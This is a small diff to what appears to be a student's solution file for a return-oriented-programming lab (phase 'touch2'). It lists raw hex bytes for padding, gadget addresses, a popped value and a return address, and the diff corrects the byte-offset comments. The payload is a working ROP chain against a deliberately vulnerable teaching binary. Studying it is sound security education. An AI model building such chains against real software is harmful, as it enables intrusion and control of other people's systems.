@@ -5,5 +5,5 @@
 33 33 33 33 33 33 33 33       /* 32: Padding 8 bytes              */
 8a 1a 40 00 00 00 00 00       /* 40: popq %rax; retq              */
 88 7a 22 43 00 00 00 00       /* 48: Value popped to %rax         */
-76 1a 40 00 00 00 00 00       /* 52: movq %rax, %rdi; retq        */
-bc 18 40 00 00 00 00 00       /* 46: Return to touch2             */
+76 1a 40 00 00 00 00 00       /* 56: movq %rax, %rdi; retq        */
+bc 18 40 00 00 00 00 00       /* 64: Return to touch2             */
